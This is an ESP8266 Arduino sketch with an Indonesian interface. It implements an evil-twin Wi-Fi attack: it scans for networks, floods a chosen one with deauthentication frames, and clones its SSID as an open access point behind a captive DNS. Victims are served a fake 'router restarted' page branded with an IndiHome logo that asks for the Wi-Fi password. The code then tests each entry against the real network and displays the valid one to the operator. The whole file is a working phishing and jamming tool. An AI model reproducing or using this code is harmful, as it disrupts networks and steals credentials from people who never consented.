#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266mDNS.h>
#include <WiFiUdp.h>
#include <ArduinoOTA.h>
#include "LittleFS.h"


String AP=""; // Nama Acces Point Web UI Control
String AP_Pass=""; // Password Acces Point Web UI Control


extern "C" {
 #include "user_interface.h" 
 }  

typedef struct
 {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
 }  _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

bool hotspot_active = false;
bool deauthing_active = false;

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style>"
                   ".content {max-width: 500px;margin: auto;}"
                   "table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}"

                   "/* Button Styles */"
                   "button {"
                   "  background-color: #f44336;"
                   "  color: white;"
                   "  padding: 10px 20px;"
                   "  border: none;"
                   "  border-radius: 5px;"
                   "  cursor: pointer;"
                   "  transition: background-color 0.3s ease;" /* Smooth transition */
                   "}"

                   "button:hover {"
                   "  background-color: #da190b;"
                   "}"

                   "button:active {"
                   "  background-color: #b71c1c;"
                   "}"

                   "/* Disabled Button Styles */"
                   "button[disabled] {"
                   "  background-color: #cccccc; /* Grey for disabled */"
                   "  cursor: not-allowed;"
                   "}"

                   "/* Table Row Hover */"
                   "tr:hover {"
                   "  background-color: #f5f5f5; /* Light grey on row hover */"
                   "}"

                   "/* Table Header Styles */"
                   "th {"
                   "  background-color: #3498db; /* Blue for table headers */"
                   "  color: white;"
                   "}"
                   "</style>"
                   "</head><body><div class='content'>"

                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Pilih</th></tr>"
                   "<body> By @arvito_yo </body>"
;


String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("AP", "AP_Pass");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  ArduinoOTA.begin();
  LittleFS.begin();
  webServer.on("/indihome.png", HTTP_GET, []() {
  File file = LittleFS.open("/indihome.png", "r");
  webServer.streamFile(file, "image/png");
  file.close();
  });

}

void loop() {
  ArduinoOTA.handle();
  runTwinEvil();
}


void runTwinEvil() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    deauthPacket[0] = 0xC0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauthPacket[0] = 0xA0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }
}
void handleAdmin() {
  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      deauthing_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      deauthing_active = false;
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("AP", "AP_Pass");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Dipilih</button></form></td></tr>";
    } else {
      _html += "<button>Pilih</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop Deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Mulai Deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Mulai EvilTwin");
      _html.replace("{hotspot}", "start");
    }

  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);
}

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      deauthing_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      deauthing_active = false;
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("AP", "AP_Pass");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (!hotspot_active) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Dipilih</button></form></td></tr>";
      } else {
        _html += "<button>Pilih</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop Deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Mulai Deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Mulai EvilTwin");
      _html.replace("{hotspot}", "start");
    }

    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Menghubungkan ulang, mohon tunggu...</h2></body> </html>");
    } else {
      webServer.send(200, "text/html",
       "<!DOCTYPE html><html><head>"
       "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
       "<title>Update Router</title>"
       "<style>"
       "body { font-family: Arial, sans-serif; background-color: #f2f2f2; display: flex; flex-direction: column; justify-content: flex-start; align-items: center; height: 100vh; margin: 0; padding-top: 20px; }"
       ".container { background-color: #ffffff; padding: 30px 40px; border-radius: 15px; box-shadow: 0 8px 16px rgba(0,0,0,0.2); text-align: center; width: 90%; max-width: 400px; }"
       "h2 { color: #333333; }"
       "label { font-size: 16px; display: block; margin-bottom: 8px; color: #555555; text-align: left; }"
       "input[type='text'] { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #cccccc; border-radius: 5px; font-size: 16px; }"
       "input[type='submit'] { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }"
       "input[type='submit']:hover { background-color: #45a049; }"
       "</style>"
       "</head><body>"

       "<img src='/indihome.png' style='max-width:250px;height:auto;margin-bottom:20px;'>"

       "<div class='container'>"
       "<h2>Router '<span style='color:#0077cc'>" + _selectedNetwork.ssid + "</span>' direstart</h2>"
       "<form action='/submit-password' method='post'>"
       "<label for='password'>Masukkan Ulang Password WiFi:</label>"
       "<input type='text' id='password' name='password' minlength='8' required>"
       "<input type='submit' value='Kirim'>"
       "</form>"
       "</div>"

       "</body></html>");

    }
  }
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Password Salah</h2><p>Mohon, coba lagi.</p></body> </html>");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    deauthing_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("AP", "AP_Pass");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
   _correct = "Berhasil mendapatkan password untuk<br>"
           "WiFi: <span style='color:green'>" + _selectedNetwork.ssid + "</span><br>"
           "Password: <span style='color:green'>" + _tryPassword + "</span>";
  }
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}